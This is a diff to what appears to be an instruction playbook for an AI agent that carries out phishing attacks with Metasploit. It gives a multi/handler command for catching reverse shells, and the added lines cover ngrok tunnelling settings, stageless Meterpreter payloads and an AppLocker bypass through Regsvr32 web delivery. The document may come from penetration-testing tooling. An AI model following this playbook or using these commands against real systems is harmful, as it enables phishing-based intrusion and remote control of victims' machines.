@@ -50,6 +50,7 @@ It tells you whether to use REVERSE or BIND mode. Follow ONLY that mode's setup.
 ```
 use exploit/multi/handler; set PAYLOAD <payload_from_step_3>; set LHOST <LHOST>; set LPORT <LPORT>; run -j
 ```
+Follow the exact handler commands from "Pre-Configured Payload Settings" above (includes ngrok settings if active).
 
 **BIND mode handler (rare for phishing, target must be reachable):**
 ```
@@ -239,8 +240,9 @@ metasploit_console: "sessions -l"
 |---------|-----|
 | msfvenom "Invalid payload" | Check payload name: `kali_shell: "msfvenom --list payloads \\| grep <term>"` |
 | Fileformat module "exploit completed but no session" | EXPECTED — fileformat modules generate files, not sessions. Session comes when target opens the file. |
-| Handler dies immediately | Check LHOST is correct. Use `0.0.0.0` if unsure. |
-| Target executes but no callback | Check firewall/NAT. Try `reverse_https` or `bind_tcp` instead. |
+| Handler dies immediately | Check LHOST is correct. If using ngrok, ensure `ReverseListenerBindAddress 127.0.0.1` and `ReverseListenerBindPort 4444` are set. |
+| Target executes but no callback | Check firewall/NAT. Try `reverse_https` or `bind_tcp` instead. If using ngrok, verify you are using a STAGELESS payload (underscore `_` not slash `/`). |
+| Session opens then dies instantly (ngrok) | You are using a STAGED payload — switch to STAGELESS (e.g. `meterpreter_reverse_tcp` not `meterpreter/reverse_tcp`). |
 | "Payload is too large" | Use staged payload (e.g., `reverse_tcp` not `reverse_tcp_rc4`) or different encoder. |
 | Web delivery one-liner blocked | Try different TARGET (Regsvr32=3 for AppLocker bypass). |
 | **Same approach fails 3+ times** | **STOP. Use action="ask_user" to discuss alternative approaches.** |
